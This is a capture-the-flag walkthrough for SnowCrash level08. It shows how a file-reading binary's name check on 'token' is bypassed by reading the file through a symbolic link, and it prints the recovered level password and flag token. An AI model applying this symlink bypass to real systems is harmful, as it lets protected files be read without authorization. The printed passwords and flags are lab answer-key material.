## 1 Watch files

``` bash 
level08@SnowCrash:~$ ls
level08  token
```
Understanding the Binary
Executable Usage:
## 2 executing 

``` bash
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
```

 This indicates that the program expects a file as an argument.
Error Messages:

The binary includes error messages such as:
`You may not access '%s'`

``` bash
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

These messages suggest that the program is designed to read the specified file and checks access permissions.

The string token appears multiple times in the binary's strings output. This suggests that this file is crucial to the binary's functionality.
## 3 Initial Attempt:

Executing ./level08 token results in the message: You may not access 'token'. This indicates that the program enforces access restrictions on the token file.

* Using Symbolic Links: 

To bypass the direct access restrictions, create a symbolic link to the token file:
``` bash
level08@SnowCrash:~$ ln -s ~/token /tmp/8
``` 
## 4 After creating the symbolic link, you can successfully read the file by executing:

``` bash
level08@SnowCrash:~$ ./level08 /tmp/8
quif5eloekouj29ke0vouxean
```

The program should now operate correctly and allow access to the contents of the token file.

The level08 executable requires a file to read as an argument, and while it restricts direct access to the token file, using a symbolic link provides a valid method to interact with it successfully.

## 5 Enter Level 09
``` bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$ su level09
Password: 25749xKZ8L7DkSCwJkT9dyv6f
```

